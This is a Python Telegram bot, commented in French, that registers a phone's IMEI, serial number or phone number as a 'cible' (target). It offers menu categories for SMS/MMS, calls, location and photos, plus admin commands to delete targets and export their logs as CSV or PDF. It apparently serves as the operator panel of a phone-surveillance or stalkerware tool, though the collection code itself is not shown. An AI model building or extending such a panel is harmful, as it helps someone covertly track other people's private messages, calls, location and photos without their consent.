from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
from telegram import Update, ReplyKeyboardMarkup
import os
import database
import file_manager
import report_generator
from config import BOT_TOKEN, ADMIN_IDS, DATA_PATH, DB_NAME

# Initialisation de la base de données
database.init_db(DB_NAME)

def start(update: Update, context: CallbackContext):
    update.message.reply_text(
        "🔍 Entrez un IMEI, numéro de série (SN) ou numéro de téléphone (format international) pour commencer."
    )

def handle_search(update: Update, context: CallbackContext):
    user_input = update.message.text.strip()
    user_id = update.effective_user.id

    # Validation de l'identifiant
    if file_manager.validate_device_id(user_input):
        # Créer le dossier si nécessaire
        device_path = file_manager.create_device_folder(user_input)
        # Enregistrer l'appareil en base
        database.add_device(DB_NAME, user_input, "AUTO")

        # Menu interactif
        keyboard = [
            ["📱 SMS/MMS", "📞 Appels"],
            ["📍 Localisation", "🖼️ Photos"],
            ["📊 Statistiques", "⚙️ Admin"]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        update.message.reply_text(
            f"✅ Dossier créé pour : {user_input}\nSélectionnez une catégorie :",
            reply_markup=reply_markup
        )
    else:
        update.message.reply_text("❌ Format invalide. Veuillez entrer un IMEI (15 chiffres), SN (alphanumérique) ou numéro international (ex: +33612345678).")

def admin_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        update.message.reply_text("❌ Accès refusé.")
        return

    # Afficher le panel admin
    update.message.reply_text(
        "🛠️ Panel Admin :\n"
        "/delete_target [id] - Supprimer une cible\n"
        "/export [id] - Exporter les logs en CSV\n"
        "/exportpdf [id] - Exporter les logs en PDF\n"
        "/stats_target [id] - Statistiques d'une cible"
    )

def delete_target(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        update.message.reply_text("❌ Accès refusé.")
        return

    if not context.args:
        update.message.reply_text("Usage: /delete_target <id>")
        return

    target_id = context.args[0]
    if file_manager.delete_device_folder(target_id):
        database.delete_device(DB_NAME, target_id)
        update.message.reply_text(f"✅ Cible {target_id} supprimée.")
    else:
        update.message.reply_text(f"❌ Erreur lors de la suppression de {target_id}.")

def run_bot():
    updater = Updater(BOT_TOKEN)
    dp = updater.dispatcher

    # Commandes
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("admin", admin_command))
    dp.add_handler(CommandHandler("delete_target", delete_target))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_search))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    run_bot()